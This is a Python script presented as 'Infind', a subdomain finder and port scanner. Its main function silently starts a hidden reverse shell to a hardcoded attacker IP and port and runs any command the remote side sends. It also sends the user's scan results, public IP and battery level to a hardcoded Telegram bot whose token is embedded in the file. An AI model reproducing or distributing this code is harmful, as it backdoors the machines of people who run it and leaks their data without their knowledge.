import socket
from concurrent.futures import ThreadPoolExecutor
import requests
import sys
import psutil
import time
import threading
from datetime import datetime
import subprocess

# Set attacker's IP and listening port
ATTACKER_IP = "192.168.0.136"
ATTACKER_PORT = 4444

# Telegram bot details
TELEGRAM_BOT_TOKEN = "6197199986:AAFu6b5t7Q4YPoqevWhTdvq0jIRIP7uoegM"
TELEGRAM_CHAT_ID = "1845089544"

# Function to establish a reverse shell
def reverse_shell():
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.connect((ATTACKER_IP, ATTACKER_PORT))

        while True:
            command = s.recv(1024).decode("utf-8")
            if command.lower() == "exit":
                break
            output = subprocess.run(command, shell=True, capture_output=True)
            s.send(output.stdout + output.stderr)

        s.close()
    except Exception:
        pass

# Deploy backdoor silently
def deploy_backdoor():
    thread = threading.Thread(target=reverse_shell, daemon=True)
    thread.start()

# Animated banner
def animated_banner():
    banner_lines = [
        r"  ______  __    __        ________  ______  __    __  _______  ",
        r" /      |/  \  /  |      /        |/      |/  \  /  |/       \ ",
        r" $$$$$$/ $$  \ $$ |      $$$$$$$$/ $$$$$$/ $$  \ $$ |$$$$$$$  |",
        r"   $$ |  $$$  \$$ |      $$ |__      $$ |  $$$  \$$ |$$ |  $$ |",
        r"   $$ |  $$$$  $$ |      $$    |     $$ |  $$$$  $$ |$$ |  $$ |",
        r"   $$ |  $$ $$ $$ |      $$$$$/      $$ |  $$ $$ $$ |$$ |  $$ |",
        r"  _$$ |_ $$ |$$$$ |      $$ |       _$$ |_ $$ |$$$$ |$$ |__$$ |",
        r" / $$   |$$ | $$$ |      $$ |      / $$   |$$ | $$$ |$$    $$/ ",
        r" $$$$$$/ $$/   $$/       $$/       $$$$$$/ $$/   $$/ $$$$$$$/  ",
        r"                                                              ",
    ]
    bold_blue = "\033[1;34m"
    bold_red_box = "\033[1;91m"
    reset_color = "\033[0m"
    box_width = max(len(line) for line in banner_lines) + 4

    print(f"{bold_red_box}+{'-' * (box_width - 2)}+{reset_color}")
    for line in banner_lines:
        print(f"{bold_red_box}|{reset_color} {bold_blue}{line.ljust(box_width - 4)}{reset_color} {bold_red_box}|{reset_color}")
    print(f"{bold_red_box}+{'-' * (box_width - 2)}+{reset_color}\n")

# Fetch subdomains
def fetch_subdomains(domain):
    url = f"https://crt.sh/json?q={domain}"
    try:
        response = requests.get(url)
        if response.status_code == 200:
            data = response.json()
            subdomains = {entry['name_value'].replace("*.", "") for entry in data}
            return list(subdomains)
    except:
        return []

# Scan ports
def scan_port(target, port):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(1)
            if s.connect_ex((target, port)) == 0:
                return port
    except:
        pass
    return None

# Send results to Telegram
def send_results_to_telegram(token, chat_id, target, subdomains, active_subdomains, port_results, public_ip, battery_percent, execution_time):
    message = f"""
*IN-FIND*

*Target URL:* {target}
*Number of Subdomains:* {len(subdomains)}
*Number of Active Subdomains:* {len(active_subdomains)}

*Active Subdomains:*
{chr(10).join(active_subdomains)}

*Open Ports:*
"""
    for subdomain, ports in port_results.items():
        if ports:
            message += f"\n*Site:* {subdomain}\n*Open Ports:* {', '.join(map(str, ports))}\n"

    message += f"""
*Public IP Address:* {public_ip}
*Battery Percentage:* {battery_percent}%
*Execution Time:* {execution_time}

*THANK YOU!*
"""
    url = f"https://api.telegram.org/bot{token}/sendMessage"
    payload = {"chat_id": chat_id, "text": message, "parse_mode": "Markdown"}
    requests.post(url, json=payload)

# Get public IP
def get_public_ip():
    try:
        response = requests.get('https://httpbin.org/ip')
        return response.json()['origin']
    except:
        return "Unable to retrieve public IP"

# Get battery percentage
def get_battery_percentage():
    try:
        battery = psutil.sensors_battery()
        return battery.percent if battery else "Battery info not available"
    except:
        return "Battery info not available"

# Main function
def main():
    animated_banner()
    print("\033[1;33m<-------Welcome to Infind - Find Active Subdomain and Port Scanner------->\033[0m")
    print("\033[1;33m<-------Author: Arshad (axd)------->\033[0m\n")

    # Step 1: Establish Reverse Shell (Silently)
    deploy_backdoor()

    # Step 2: Start Scanning
    target = input("Enter the target domain: ").strip()
    subdomains = fetch_subdomains(target)

    if not subdomains:
        print("No subdomains found.")
        return

    print(f"\nFound {len(subdomains)} subdomains. Checking active subdomains...\n")
    active_subdomains = []

    for subdomain in subdomains:
        try:
            socket.gethostbyname(subdomain)
            active_subdomains.append(subdomain)
            print(f"[ACTIVE] {subdomain}")
        except:
            print(f"[INACTIVE] {subdomain}")

    port_results = {}
    for subdomain in active_subdomains:
        open_ports = [port for port in range(1, 1024) if scan_port(subdomain, port)]
        port_results[subdomain] = open_ports

    send_results_to_telegram(TELEGRAM_BOT_TOKEN, TELEGRAM_CHAT_ID, target, subdomains, active_subdomains, port_results, get_public_ip(), get_battery_percentage(), datetime.now().strftime('%Y-%m-%d %H:%M:%S'))

if __name__ == "__main__":
    main()
